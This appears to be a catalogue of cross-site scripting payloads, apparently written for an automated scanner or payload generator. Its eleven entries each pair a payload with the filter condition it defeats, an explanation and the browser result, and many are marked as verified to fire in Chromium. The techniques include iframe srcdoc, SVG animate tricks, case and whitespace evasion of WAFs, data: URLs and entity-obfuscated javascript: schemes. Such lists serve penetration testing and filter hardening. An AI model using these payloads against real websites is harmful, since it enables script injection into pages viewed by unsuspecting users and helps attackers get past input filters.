1. XSS with Iframe srcdoc Attribute
- Payload: <iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded
- Case: The srcdoc attribute of an iframe specifies the HTML content of the iframe. Inject an img tag with onerror inside srcdoc to execute JavaScript
- Output: <iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>

---

2. XSS with Iframe srcdoc and HTML Entities
- Payload: <iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>
- Condition: Input is reflected into HTML where angle brackets (< >) ARE encoded but HTML entities are allowed
- Case: Use HTML entities inside the srcdoc attribute. The browser decodes the entities and renders the img tag inside the iframe
- Output: <iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>

---

3. XSS with Accesskey on Hidden Inputs
- Payload: <input type="hidden" accesskey="X" onclick="alert(1)">
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded and the input is a hidden field
- Case: Hidden inputs are normally not exploitable, but the accesskey attribute can enable XSS. Press ALT+SHIFT+X (Windows) or CTRL+ALT+X (Mac) to trigger the onclick event
- Output: <input type="hidden" accesskey="X" onclick="alert(1)">

---

4. XSS with SVG Animate Tag using Values
- Payload: <svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded
- Case: Use the SVG animate tag to set the href attribute of an anchor element to a javascript: URL via the values attribute
- Output: SVG animate sets href to javascript:alert(1), clicking the text triggers XSS

---

5. XSS with SVG Animate Tag using To
- Payload: <svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded
- Case: Use the SVG animate tag with the from attribute to set the href to a javascript: URL
- Output: SVG animate sets href to javascript:alert(1), clicking the text triggers XSS

---

6. XSS with Form Action JavaScript URL
- Payload: <form action="javascript:alert(1)"><input type="submit"></form>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded
- Case: Form action attribute accepts javascript: URL, bypasses filters that block event handlers
- Output: <form action="javascript:alert(1)"><input type="submit"></form> → clicking submit triggers alert(1)

---

7. Alternating-Case HTML Names (lowercase-filter evasion)
- Payload: <SvG OnLoAd=alert(1)>  or  '/AuToFoCuS/OnFoCuS='…'//'  or  <ScRiPt>alert(1)</ScRiPt>
- Condition: Filter/WAF matches tag or attribute names literally in lowercase (e.g. `svg`, `onload`, `script`) while the HTML parser itself is case-insensitive
- Case: Canonical alternating caps — position 1 (odd) uppercase, position 2 (even) lowercase, repeating — applied to tag names and attribute/event-handler names only: Opening Tag, Attribute, Closing Tag. Attribute values and JavaScript bodies stay verbatim (`OnErRoR=alert(1)` works because `alert` is JS and case-sensitive there). Applied as the final stage over finished payloads — no upstream grammar needs to know about case.
- Output: <SvG OnLoAd=alert(1)> -> FIRED: 1 ;  '/AuToFoCuS/OnFoCuS='throw/**/self.onerror=alalertert,1'//' -> FIRED: Uncaught 1

---

8. Alternate ASCII-Whitespace Attribute Separators
- Payload: '/autofocus/onfocus='alert(1)'//' already covers space-stripped; now additionally `"	autofocus	onfocus=alert(1)//{m}` (TAB), `"\x0cautofocus\x0confocus=alert(1)//{m}` (FF), `" autofocus onfocus =alert(1)` (space around `=`)
- Condition: Filter strips only the space character (or signs the exact `autofocus onfocus=` junction); HTML spec 13.1.2.3 accepts TAB/LF/FF/CR between attributes and whitespace may surround `=` in a tag.
- Case: Each separator emits only when its probe survives (`attr_tab`, `newline`, `form_feed`, `carriage_return`, `eq`); tried after the slash path so they only fill the space+slash-both-dead niche.
- Output (Chromium): `<input\tautofocus\tonfocus=window.__fired=1>` -> FIRED ; `<input\x0cautofocus\x0confocus=...>` -> FIRED ; `onfocus =fn` -> FIRED

---

9. Extended Auto-Fire Vectors (verified in Chromium)
- Payload: `<video src=x {m} onloadstart=alert(1)>` , `<audio src=x {m} onloadstart=alert(1)>` , `<svg><animate attributeName=x dur=1s {m} onbegin=alert(1)></svg>` , `<style>@keyframes a{}</style><xss {m} style=animation-name:a onanimationstart=alert(1)>` , `<select autofocus {m} onfocus=alert(1)>` , `<xss autofocus tabindex=1 {m} onfocus=alert(1)>`
- Condition: Angle brackets pass; each tag/event/pair atom probed (`video_tag`, `onloadstart`, `animate_tag`, `onbegin`, `onanimationstart`, `pair_video_onerror`, `pair_animate_onbegin`, ...). `tabindex=1` makes ANY element (incl. custom tags) focusable so `autofocus`/`onfocus` works beyond built-ins.
- Case: SMIL `onbegin` fires at animation start; `onloadstart` fires during media fetch; `onanimationstart` fires when the keyframes rule applies — zero user interaction. `onfocusin` (bubbling) drops in when `onfocus` alone is filtered.
- Output: all FIRED in Chromium. NOTE `marquee onbounce`/`onstart` were dropped — they never fire in modern headless Chrome, so emitting them was a false-V source.

---

10. `data:` URL Sinks
- Payload: `<iframe {m} src="data:text/html,&lt;svg onload=alert(1)&gt;"></iframe>` , `<iframe {m} src="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+"></iframe>` , `<script {m} src="data:text/javascript,alert(1)"></script>`
- Condition: `<`-aware filters sign `svg onload`/`script` inside the attribute but let `data:` through (`data_proto` probe); entity/base64 arms keep the executable markup non-contiguous.
- Case: `data:text/html` iframes execute embedded markup in an opaque origin (alert proves execution; `parent.` access is cross-origin-blocked — verification uses the dialog). `data:text/javascript` `<script src>` executes directly in page context.
- Output (Chromium): `data:` iframe `<svg onload=alert(1)>` -> FIRED ; `<script src="data:text/javascript,...">` -> FIRED

---

11. Alternate `javascript:` Scheme Spellings
- Payload: `href="java\tscript:alert(1)"` , `href="javascript&colon;alert(1)"` , `href="&#x6a;avascript:alert(1)"`
- Condition: `javascript:` keyword blocked (`javascript_proto` fails) but TAB survives (`js_scheme_tab`) or `&colon;`/hex-ref entities survive (`js_scheme_colon_ref`, `hex_ref`); the URL parser strips TAB/LF out of scheme names and entities decode inside the attribute value before navigation.
- Case: emitted only in the `javascript_proto` BLOCKED branch of url-attr contexts.
- Output (Chromium): `java\tscript:` -> FIRED ; `&#x6a;avascript:` -> FIRED. NOTE `javascript://\nalert(1)` was dropped — the URL parser strips `\n` before the JS handler sees it, so `//` comments out the rest and it never fires.
